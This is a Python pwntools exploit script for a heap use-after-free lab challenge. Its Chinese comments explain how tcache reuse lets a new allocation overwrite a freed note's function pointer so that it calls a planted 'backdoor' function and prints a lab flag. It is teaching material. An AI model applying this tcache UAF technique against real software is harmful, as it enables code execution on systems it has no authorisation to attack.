#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_heap_uaf —— 函数指针 UAF 参考 exploit

关键：add() 里 data 与 struct 同为 0x20 chunk（size=0x18 → 0x20 chunk，
struct note 也是 16 字节 → 0x20 chunk），两次 free 之后 tcache 是
  [S1, D1, S0, D0]
下一次 add(0x18) 的 data 会拿到队首 S1（旧 note1 的结构体），
所以把 payload 写进去就等于改写 note1 的 {data, fn} → 再用 show(1) 调 fn。

用法：
    cd labs/lab_heap_uaf
    make
    printf '__PWNED__{uaf}\\n' > flag.txt
    python exp.py
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))


def start():
    if HOST:
        return remote(HOST, PORT)
    return process(BIN)


def add(p, idx, size, data):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)


def free(p, idx):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"done")


def show(p, idx):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"index: ", str(idx).encode())


def exploit():
    e = ELF(BIN, checksec=False)
    backdoor = e.symbols["backdoor"]
    log.info("backdoor = %#x", backdoor)

    p = start()

    # data(0x18 → 0x20 chunk) 与 struct(0x20 chunk) 同 size class
    add(p, 0, 0x18, b"A" * 0x18)
    add(p, 1, 0x18, b"B" * 0x18)
    free(p, 0)                     # tcache[0x20]: S0, D0
    free(p, 1)                     # tcache[0x20]: S1, D1, S0, D0

    # 这次 add 的 data 落在 S1 上 → 直接改写 note1 的结构体
    add(p, 2, 0x18, p64(0) + p64(backdoor) + b"C" * 8)

    show(p, 1)                     # stale note1 -> fn(backdoor)
    p.recvuntil(b"here is your flag:")
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_heap_uaf/flag.txt")
    log.success("heap uaf OK")
